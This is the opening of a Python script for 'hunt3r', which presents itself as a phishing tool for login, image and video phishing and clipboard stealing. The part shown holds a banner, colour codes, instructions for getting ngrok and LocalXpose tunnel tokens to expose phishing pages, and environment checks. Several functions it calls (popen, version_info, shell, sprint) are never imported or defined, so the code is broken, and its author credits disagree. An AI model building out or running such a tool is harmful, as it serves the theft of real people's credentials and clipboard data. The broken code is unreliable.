# -*- coding: UTF-8 -*-
# ToolName   : hunt3r
# Author     : Spyder
# Version    : 1.0
# License    : GPL V3
# Copyright  : Spyder (2021-2022)
# Github     : https://github.com/portable36
# Description: hunt3r
# Tags       : Multi phishing, login phishing, image phishing, video phishing, clipboard steal
# 1st Commit : 12/10/2022
# Language   : Python
# Portable file/script
# If you copy open source code, consider giving credit
# Env        : #!/usr/bin/env python



import json
import urllib.request
import webbrowser
import os
import os, sys, time

# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"
# Bold
bblack="\033[1;30m"
bred="\033[1;31m"
bgreen="\033[1;32m"
byellow="\033[1;33m"
bblue="\033[1;34m"
bpurple="\033[1;35m"
bcyan="\033[1;36m"
bwhite="\033[1;37m"

version="1.0"

# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

logo='''
'''+green+''' _   _             _   _____      
'''+red+'''| | | |_   _ _ __ | |_|___ / _ __ 
'''+cyan+'''| |_| | | | | '_ \| __| |_ \| '__|
'''+yellow+'''|  _  | |_| | | | | |_ ___) | |   
'''+blue+'''|_| |_|\__,_|_| |_|\__|____/|_|   
'''+purple+'''  By '''+yellow+'''Amzad Hossain                                
'''+green+'''
'''
def slowprint(n):
    for word in n + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.01)
slowprint(logo)

nr_help = f"""
{info}Steps: {nc}
{blue}[1]{yellow} Go to {green}https://ngrok.com
{blue}[2]{yellow} Create an account 
{blue}[3]{yellow} Login to your account
{blue}[4]{yellow} Visit {green}https://dashboard.ngrok.com/get-started/your-authtoken{yellow} and copy your authtoken
"""

lx_help = f"""
{info}Steps: {nc}
{blue}[1]{yellow} Go to {green}https://localxpose.io
{blue}[2]{yellow} Create an account 
{blue}[3]{yellow} Login to your account
{blue}[4]{yellow} Visit {green}https://localxpose.io/dashboard/access{yellow} and copy your authtoken
"""

packages = [ "php", "ssh" ]
modules = [ "requests", "bs4" ]
tunnelers = [ "ngrok", "cloudflared", "loclx" ]
processes = [ "php", "ssh", "ngrok", "cloudflared", "loclx", "localxpose", ]
extensions = [ "png", "gif", "webm", "mkv", "mp4", "mp3", "wav", "ogg" ]


try:
    test = popen("cd $HOME && pwd").read()
except:
    exit()

supported_version = 3

if version_info[0] != supported_version:
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)
    
    # Clear the screen and show logo
def clear(fast=False, lol=False):
    shell("clear")
    if fast:
        print(logo)
    elif lol:
        lolcat(logo)
    else:
        sprint(logo, 0.01)
